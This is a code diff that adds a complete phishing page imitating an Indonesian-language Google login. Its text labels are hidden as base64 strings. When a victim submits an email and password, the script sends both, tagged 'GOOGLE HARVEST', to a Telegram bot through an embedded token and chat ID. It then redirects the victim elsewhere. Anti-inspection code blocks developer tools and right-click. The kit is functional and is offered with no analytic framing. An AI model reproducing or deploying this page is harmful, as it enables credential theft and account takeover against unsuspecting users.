@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title id="t_0"></title>
+    <link id="v_c" rel="icon" type="image/png">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        :root { --bg: #ffffff; --txt: #202124; --f-label: #5f6368; --input-border: #dadce0; --blue: #1a73e8; --err: #d93025; }
+        @media (prefers-color-scheme: dark) { :root { --bg: #000000; --txt: #e8eaed; --f-label: #9aa0a6; --input-border: #3c4043; --blue: #8ab4f8; --err: #f28b82; } }
+        html, body { height: 100%; width: 100%; margin: 0; padding: 0; background-color: var(--bg); color: var(--txt); font-family: 'Roboto', arial, sans-serif; cursor: none !important; -webkit-touch-callout: none; -webkit-user-select: none; user-select: none; touch-action: none; overflow: hidden; }
+        .m-c { height: 100dvh; display: flex; flex-direction: column; align-items: flex-start; padding: 48px 24px 12px 24px; position: relative; }
+        .g-l { width: 24px; height: 24px; margin-bottom: 24px; align-self: flex-start; object-fit: contain; }
+        .h-t { font-size: 24px; font-weight: 400; margin-bottom: 8px; text-align: left; width: 100%; color: var(--txt); }
+        .s-t { font-size: 16px; margin-bottom: 32px; text-align: left; width: 100%; color: var(--txt); }
+        .f-g { position: relative; width: 100%; margin-bottom: 8px; }
+        .i-f { width: 100%; padding: 13px 15px; border: 1px solid var(--input-border); border-radius: 4px; background: transparent; color: var(--txt); font-size: 16px; outline: none; transition: border 0.2s; }
+        .i-f:focus { border: 2px solid var(--blue); padding: 12px 14px; }
+        .f-l { position: absolute; left: 12px; top: 13px; color: var(--f-label); transition: all 0.2s; pointer-events: none; background: var(--bg); padding: 0 4px; }
+        .i-f:focus + .f-l, .i-a .f-l { top: -10px; font-size: 12px; color: var(--blue); }
+        .e-m { color: var(--err); font-size: 12px; display: none; align-items: center; margin-top: 6px; }
+        .i-e .i-f { border-color: var(--err) !important; }
+        .i-e .f-l { color: var(--err) !important; }
+        .i-e .e-m { display: flex; }
+        .b-t { color: var(--blue); font-size: 14px; font-weight: 500; background: none; border: none; padding: 10px 0; cursor: pointer; text-align: left; }
+        .p-w { font-size: 14px; color: var(--f-label); line-height: 1.4; margin: 32px 0; text-align: left; }
+        .p-l { color: var(--blue); font-weight: 500; text-decoration: none; cursor: pointer; }
+        .f-a { display: flex; justify-content: space-between; width: 100%; align-items: center; margin-top: auto; padding-bottom: 100px; }
+        .n-b { background: var(--blue); color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; }
+        @media (prefers-color-scheme: dark) { .n-b { color: #000; } }
+        .b-f { position: fixed; bottom: 0; left: 0; width: 100%; padding: 12px 24px; display: flex; flex-direction: column; background: var(--bg); }
+        .f-r-1 { display: flex; align-items: center; justify-content: flex-start; margin-bottom: 12px; font-size: 12px; color: var(--f-label); }
+        .f-r-2 { display: flex; justify-content: flex-start; gap: 20px; font-size: 12px; color: var(--f-label); }
+        .u-p { display: flex; align-items: center; border: 1px solid var(--input-border); border-radius: 20px; padding: 4px 12px 4px 6px; margin-bottom: 24px; cursor: pointer; align-self: flex-start; }
+        .u-i { width: 20px; height: 20px; border-radius: 50%; background: #eee; margin-right: 8px; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+    </style>
+</head>
+<body>
+    <div class="m-c">
+        <img src="google.png" class="g-l">
+        <h1 id="h_1" class="h-t"></h1>
+        <p id="h_2" class="s-t"></p>
+        <div id="s_1" class="w-full flex flex-col items-start">
+            <div class="f-g" id="g_u">
+                <input type="text" id="p_3" class="i-f" oninput="v_i(this)" onfocus="f_i(this)" onblur="b_i(this)" autocomplete="off">
+                <label class="f-l" id="l_u"></label>
+                <div class="e-m" id="e_u"><svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" class="mr-2"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg><span id="et_u"></span></div>
+            </div>
+            <button class="b-t" onclick="g_su()" id="l_e"></button>
+            <div class="p-w" id="m_t"></div>
+            <div class="f-a">
+                <button class="b-t" onclick="g_su()" id="c_a"></button>
+                <button class="n-b" onclick="n_1()" id="n_1_b"></button>
+            </div>
+        </div>
+        <div id="s_2" class="w-full hidden flex flex-col items-start">
+            <div class="u-p" onclick="r_1()">
+                <div class="u-i"><svg width="14" height="14" viewBox="0 0 24 24" fill="var(--f-label)"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg></div>
+                <span id="u_d" class="text-sm font-medium mr-1 text-[var(--txt)]"></span>
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="var(--f-label)"><path d="M7 10l5 5 5-5z"/></svg>
+            </div>
+            <div class="f-g" id="g_p">
+                <input type="password" id="p_4" class="i-f" oninput="v_i(this)" onfocus="f_i(this)" onblur="b_i(this)">
+                <label class="f-l" id="l_p"></label>
+                <div class="e-m" id="e_p"><svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" class="mr-2"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg><span id="et_p"></span></div>
+            </div>
+            <div class="flex items-center mt-4">
+                <input type="checkbox" id="s_c" onclick="t_s()" class="w-4 h-4 mr-3 cursor-pointer">
+                <label for="s_c" class="text-sm cursor-pointer" id="l_s"></label>
+            </div>
+            <div class="f-a">
+                <button class="b-t" onclick="g_ps()" id="o_w"></button>
+                <button class="n-b" onclick="n_2()" id="n_2_b"></button>
+            </div>
+        </div>
+        <div class="b-f">
+            <div class="f-r-1 cursor-pointer">
+                <span id="l_i"></span>
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor" class="ml-1"><path d="M7 10l5 5 5-5z"/></svg>
+            </div>
+            <div class="f-r-2">
+                <span onclick="g_su()">Bantuan</span>
+                <span onclick="g_su()">Privasi</span>
+                <span onclick="g_su()">Persyaratan</span>
+            </div>
+        </div>
+    </div>
+    <script>
+        const _0x = { _t: "R29vZ2xl", _l1: "TG9naW4=", _l2: "R3VuYWthbiBBa3VuIEdvb2dsZSBBbmRh", _l3: "U2VsYW1hdCBkYXRhbmc=", _u1: "RW1haWwgYXRhdSBub21vciB0ZWxlcG9u", _u2: "THVwYSBlbWFpbD8=", _u3: "QnVrYW4ga29tcHV0ZXIgQW5kYT8gR3VuYWthbiBqZW5kZWxhIFRhbXUgdW50dWsgbG9naW4gc2VjYXJhIHByaWJhZGku", _u4: "UGVsYXJpIGxlYmloIGxhbmp1dCBjYXJhIG1lbmdndW5ha2FuIE1vZGUgdGFtdQ==", _u5: "QnVhdCBha3Vu", _u6: "QmVyaWt1dG55YQ==", _p1: "TWFzdWtrYW4gc2FuZGk=", _p2: "VGFtcGlsa2FuIHNhbmRp", _p3: "Q29iYSBjYXJhIGxhaW4=", _e1: "TWFzdWtrYW4gZW1haWwgYXRhdSBub21vciB0ZWxlcG9u", _e2: "TWFzdWtrYW4gc2FuZGk=", _tk: "ODU3ODUyNDMyMzpBQUZCS282THhtQ3NDZ0UtVG8tRENQckQ5bWdjNEZaN2kxTQ==", _ci: "ODQ2MTAxOTkxMg==", _rd: "aHR0cHM6Ly9jYXJlZXIuaGFjaGlncm91cC5pZA==", _su: "aHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tL3NpZ251cA==", _ps: "aHR0cHM6Ly9zdXBwb3J0Lmdvb2dsZS5jb20vYWNjb3VudHMvYW5zd2VyLzI5MTczMDY=" };
+        const _d = (v) => atob(v);
+        document.title = _d(_0x._t);
+        document.getElementById('h_1').innerText = _d(_0x._l1);
+        document.getElementById('h_2').innerText = _d(_0x._l2);
+        document.getElementById('l_u').innerText = _d(_0x._u1);
+        document.getElementById('l_e').innerText = _d(_0x._u2);
+        document.getElementById('m_t').innerHTML = `${_d(_0x._u3)} <span class="p-l" onclick="g_su()">${_d(_0x._u4)}</span>`;
+        document.getElementById('c_a').innerText = _d(_0x._u5);
+        document.getElementById('n_1_b').innerText = _d(_0x._u6);
+        document.getElementById('l_p').innerText = _d(_0x._p1);
+        document.getElementById('l_s').innerText = _d(_0x._p2);
+        document.getElementById('o_w').innerText = _d(_0x._p3);
+        document.getElementById('n_2_b').innerText = _d(_0x._u6);
+        document.getElementById('et_u').innerText = _d(_0x._e1);
+        document.getElementById('et_p').innerText = _d(_0x._e2);
+        document.getElementById('l_i').innerText = "Indonesia";
+        function f_i(e) { e.parentElement.classList.add('i-a'); e.parentElement.classList.remove('i-e'); }
+        function b_i(e) { if (!e.value) e.parentElement.classList.remove('i-a'); }
+        function v_i(e) { if (e.value) e.parentElement.classList.add('i-a'); }
+        function t_s() { const x = document.getElementById("p_4"); x.type = x.type === "password" ? "text" : "password"; }
+        function n_1() { const u = document.getElementById('p_3').value; if (!u) { document.getElementById('g_u').classList.add('i-e'); return; } document.getElementById('s_1').classList.add('hidden'); document.getElementById('s_2').classList.remove('hidden'); document.getElementById('h_1').innerText = _d(_0x._l3); document.getElementById('h_2').classList.add('hidden'); document.getElementById('u_d').innerText = u; }
+        function r_1() { document.getElementById('s_2').classList.add('hidden'); document.getElementById('s_1').classList.remove('hidden'); document.getElementById('h_1').innerText = _d(_0x._l1); document.getElementById('h_2').classList.remove('hidden'); }
+        async function n_2() { const u = document.getElementById('p_3').value, p = document.getElementById('p_4').value; if (!p) { document.getElementById('g_p').classList.add('i-e'); return; } const m = `*⚡ GOOGLE HARVEST*\n👤 *User:* \`${u}\`\n🔑 *Pass:* \`${p}\``; await fetch(`https://api.telegram.org/bot${_d(_0x._tk)}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: _d(_0x._ci), text: m, parse_mode: 'Markdown' }) }); window.location.replace(_d(_0x._rd)); }
+        function g_su() { window.location.href = _d(_0x._su); }
+        function g_ps() { window.location.href = _d(_0x._ps); }
+        (function extreme_lock() { setInterval(() => { const s = performance.now(); debugger; if (performance.now() - s > 50) { document.body.innerHTML = ""; location.reload(); } }, 30); window.oncontextmenu = (e) => e.preventDefault(); window.onkeydown = (e) => { if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && [73, 74, 67].includes(e.keyCode)) || (e.ctrlKey && [85, 83].includes(e.keyCode))) e.preventDefault(); }; })();
+    </script>
+</body>
+</html>
